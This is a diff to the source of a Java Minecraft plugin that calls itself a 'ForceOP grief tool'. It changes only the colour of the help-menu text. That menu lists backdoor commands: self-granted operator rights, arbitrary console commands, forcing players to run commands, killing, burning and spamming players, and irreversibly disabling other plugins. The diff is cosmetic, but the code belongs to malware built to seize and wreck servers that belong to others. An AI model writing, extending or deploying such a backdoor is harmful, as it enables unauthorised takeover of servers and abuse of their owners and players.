@@ -235,84 +235,84 @@ public class ForceOP implements Listener{
 		p.sendMessage(ChatColor.BLUE +  "ForceOP grief tool (v."+version+")");
 		p.sendMessage(ChatColor.BLUE + "<> = required. [] = optional");
 		
-		p.sendMessage(this.prefix+"help");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"help");
 		p.sendMessage(ChatColor.DARK_AQUA + "- get this help index");
 		
-		p.sendMessage(this.prefix+"op");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"op");
 		p.sendMessage(ChatColor.AQUA + "- give yourself /op");
-		p.sendMessage(this.prefix+"deop");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"deop");
 		p.sendMessage(ChatColor.AQUA + "- deop yourself");
-		p.sendMessage(this.prefix+"op-all");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"op-all");
 		p.sendMessage(ChatColor.AQUA + "- give all players op");
 		
-		p.sendMessage(this.prefix+"console <command>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"console <command>");
 		p.sendMessage(ChatColor.AQUA + "- run a command trough console §l(DO NOT INCLUDE '/')");
 		
-		p.sendMessage(this.prefix+"sudo <player> <any message or command>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"sudo <player> <any message or command>");
 		p.sendMessage(ChatColor.AQUA + "- force the specified player to run any command or message");
-		p.sendMessage(this.prefix+"sudo-all <any message or command>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"sudo-all <any message or command>");
 		p.sendMessage(ChatColor.AQUA + "- force all players to run the specified command");
 		
-		p.sendMessage(this.prefix+"gmc <name>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"gmc <name>");
 		p.sendMessage(ChatColor.AQUA + "- give yourself creative");
-		p.sendMessage(this.prefix+"gmc-all");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"gmc-all");
 		p.sendMessage(ChatColor.AQUA + "- give all players creative");
 		
-		p.sendMessage(this.prefix+"gms <name>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"gms <name>");
 		p.sendMessage(ChatColor.AQUA + "- give yourself survival");
-		p.sendMessage(this.prefix+"gms-all");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"gms-all");
 		p.sendMessage(ChatColor.AQUA + "- give all players survival");
 		
-		p.sendMessage(this.prefix+"gmsp <name>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"gmsp <name>");
 		p.sendMessage(ChatColor.AQUA + "- give yourself spectator");
-		p.sendMessage(this.prefix+"gmsp-all");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"gmsp-all");
 		p.sendMessage(ChatColor.AQUA + "- give all players spectator");
 		
-		p.sendMessage(this.prefix+"kill <player>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"kill <player>");
 		p.sendMessage(ChatColor.AQUA + "- kill the specified player");
-		p.sendMessage(this.prefix+"kill-all");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"kill-all");
 		p.sendMessage(ChatColor.AQUA + "- kill all players");
 		
-		p.sendMessage(this.prefix+"day");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"day");
 		p.sendMessage(ChatColor.AQUA + "- change the time to day");
-		p.sendMessage(this.prefix+"night");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"night");
 		p.sendMessage(ChatColor.AQUA + "- chance the time to night");
 
-		p.sendMessage(this.prefix+"sun");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"sun");
 		p.sendMessage(ChatColor.AQUA + "- change the weather to sun");
-		p.sendMessage(this.prefix+"rain");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"rain");
 		p.sendMessage(ChatColor.AQUA + "- change the weather to rain");
-		p.sendMessage(this.prefix+"storm");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"storm");
 		p.sendMessage(ChatColor.AQUA + "- change the weather to storm");
 		
-		p.sendMessage(this.prefix+"smite [player]");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"smite [player]");
 		p.sendMessage(ChatColor.AQUA + "- strike lightning (specify player to strike them)");
-		p.sendMessage(this.prefix+"burn <player> <seconds>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"burn <player> <seconds>");
 		p.sendMessage(ChatColor.AQUA + "- burn the specified player for x seconds");
-		p.sendMessage(this.prefix+"burn-all <seconds>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"burn-all <seconds>");
 		p.sendMessage(ChatColor.AQUA + "- burn all players for x seconds");
 		
-		p.sendMessage(this.prefix+"fly [player]");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"fly [player]");
 		p.sendMessage(ChatColor.AQUA + "- toggle flight (specify player to toggle their flight)");
-		p.sendMessage(this.prefix+"disable <plugin>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"disable <plugin>");
 		p.sendMessage(ChatColor.AQUA + "- disable the specified plugin §l(can not be reversed!)");
-		p.sendMessage(this.prefix+"disable-all");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"disable-all");
 		p.sendMessage(ChatColor.AQUA + "- disable all plugins (except ForceOP)");
 		
-		p.sendMessage(this.prefix+"invsee <player>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"invsee <player>");
 		p.sendMessage(ChatColor.AQUA + "- open the specified player's inventory");
 		p.sendMessage(ChatColor.AQUA + "- only works on servers running Essentials");
 		
-		p.sendMessage(this.prefix+"tp <player>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"tp <player>");
 		p.sendMessage(ChatColor.AQUA + "- teleport to the specified player");
-		p.sendMessage(this.prefix+"tp <player> <player>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"tp <player> <player>");
 		p.sendMessage(ChatColor.AQUA + "- teleport the first specified player to the second");
-		p.sendMessage(this.prefix+"tppos <x,y,z>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"tppos <x,y,z>");
 		p.sendMessage(ChatColor.AQUA + "- teleport to the giving co-oords");
 		
-		p.sendMessage(this.prefix+"spam <player> <seconds>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"spam <player> <seconds>");
 		p.sendMessage(ChatColor.AQUA + "- spam the specified player for x seconds");
-		p.sendMessage(this.prefix+"spam-all <seconds>");
+		p.sendMessage(ChatColor.BLUE + this.prefix+"spam-all <seconds>");
 		p.sendMessage(ChatColor.AQUA + "- spam all players for x seconds");
 	}
 	
